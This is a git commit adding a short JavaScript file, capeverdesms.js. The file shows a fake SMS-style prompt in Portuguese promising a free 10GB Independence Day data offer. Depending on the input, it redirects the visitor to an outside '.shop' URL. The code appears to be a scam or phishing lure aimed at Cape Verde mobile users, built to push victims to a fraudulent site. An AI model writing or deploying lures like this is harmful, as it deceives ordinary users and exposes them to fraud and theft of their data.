53443aa03adbc2064eca998b338929f5cc48f136
bigetijazz6 <bigetijazz6@gmail.com>
2024-07-04 01:51:31 -0700

    Create capeverdesms.js

---
+++ capeverdesms.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('SMS: Parabéns, você foi selecionado para receber a oferta gratuita de 10GB de dados do Dia da Independência. Por favor, pressione 1 para prosseguir agora','1');
+if (password != '1') {
+location.href='https://www.offre-beta.shop/capeverde-indpendence';
+}
